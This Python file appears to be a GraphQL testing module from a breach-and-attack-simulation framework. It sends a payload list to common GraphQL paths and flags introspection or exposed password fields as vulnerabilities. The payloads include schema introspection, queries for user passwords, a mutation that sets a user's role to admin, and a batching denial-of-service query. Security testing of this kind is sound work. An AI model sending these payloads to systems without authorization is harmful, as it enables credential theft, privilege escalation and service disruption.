"""GraphQL security testing. MITRE ATT&CK: T1190"""
from __future__ import annotations
import uuid, json
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

GRAPHQL_PAYLOADS = [
    '{"query":"{__schema{types{name fields{name type{name}}}}}"}',
    '{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}}}"}',
    '{"query":"query{users{id email password role}}"}',
    '{"query":"query{user(id:1){id email password}}"}',
    '{"query":"mutation{updateUser(id:1,role:\\"admin\\"){id role}}"}',
    '{"query":"{' + 'a:__typename,' * 50 + '__typename}"}',  # Batch/DoS
]

class GraphQLModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="graphql", description="GraphQL introspection, injection, and access control", category="graphql",
            mitre_technique_ids=["T1190"], mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT, owasp_category="A01:2021 - Broken Access Control",
            cwe_ids=["CWE-200"], tags=["graphql", "api", "introspection"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        return GRAPHQL_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        paths = options.get("graphql_paths", ["/graphql", "/graphiql", "/api/graphql", "/gql"])
        return [AttackRequest(request_id=f"gql-{uuid.uuid4().hex[:8]}", target=target, method="POST",
            path=path, body=p, content_type="application/json") for p in payloads for path in paths]

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        if "__schema" in payload and response.status_code == 200 and "__schema" in body:
            return ModuleResult(module_name="graphql", target=request.target, status=VulnStatus.VULNERABLE,
                payload_used=payload, response_code=response.status_code, response_body_preview=body[:500],
                elapsed_ms=response.elapsed_ms, evidence="GraphQL introspection enabled - full schema exposed",
                severity="medium", mitre_technique_id="T1190")
        if "password" in body.lower() and response.status_code == 200:
            return ModuleResult(module_name="graphql", target=request.target, status=VulnStatus.VULNERABLE,
                payload_used=payload, response_code=response.status_code, response_body_preview=body[:500],
                elapsed_ms=response.elapsed_ms, evidence="GraphQL exposes sensitive fields (password)",
                severity="critical", mitre_technique_id="T1190")
        return ModuleResult(module_name="graphql", target=request.target, status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
